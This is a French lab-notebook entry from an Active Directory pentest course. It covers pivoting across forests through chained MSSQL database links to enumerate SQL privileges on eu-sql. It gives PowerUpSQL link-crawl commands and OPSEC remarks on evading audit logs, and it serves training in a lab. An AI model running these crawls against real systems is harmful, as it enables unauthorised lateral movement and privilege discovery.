---
flag: 39
machine: dcorp-mssql
statut: à faire
technique: MSSQL link crawl (cross-forest)
LO: "[[LO22 - MSSQL links]]"
---

# F39 · Privilèges SQL sur eu-sql

> [!summary] Objectif
> Déterminer les privilèges SQL Server effectifs sur `eu-sql` (forêt eurocorp) au bout de la chaine de links depuis `dcorp-mssql`.

## Contexte
- **Etape attack flow**: pivot **cross-forest** via database links — atteindre l'instance `eu-sql` sans jamais s'authentifier en direct côté eurocorp.
- **Ce qu on a**: chaine complète crawlée jusqu'à `eu-sql` (via `dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql` ou variante).
- **Ce qu on cherche**: le(s) rôle(s) serveur SQL détenu(s) sur `eu-sql` (`public`, `sysadmin`, `dbowner`…).

## Solution

### Etape 1: Confirmer la portée du crawl
```powershell
Import-Module C:\AD\Tools\PowerUpSQLmaster\PowerupSQL.psd1
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version'
```
Vérifier que `eu-sql` répond bien en bout de chaine.

### Etape 2: Enumérer les rôles serveur sur eu-sql
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "SELECT IS_SRVROLEMEMBER('sysadmin')" -QueryTarget eu-sql
```
Ou lister tous les rôles serveur possédés:
```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER(name, SUSER_NAME()) = 1" -QueryTarget eu-sql
```
→ Voir [[Cheatsheet - MSSQL et PowerUpSQL]].

## Reponse

| Element | Valeur |
|---------|--------|
| Privilèges SQL sur eu-sql | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- `IS_SRVROLEMEMBER('sysadmin')` renvoie 1/0 — commencer par ça pour statuer vite avant d'énumérer tout.
- Le compte effectif côté `eu-sql` dépend de la configuration cumulée de tous les links traversés (chaque lien peut réauthentifier).
- xEvents / SQL audit côté eu-sql peut logger les `openquery` inhabituels — chaque saut est visible sur son serveur.

## Refs
- [[Cheatsheet - MSSQL et PowerUpSQL]]
- [[Synthèse - MSSQL]]
- [[LO22 - MSSQL links]]
- [[Cheatsheet - Trusts et forêts]]
- [[Flags - Index]] · [[Journal - Index]]
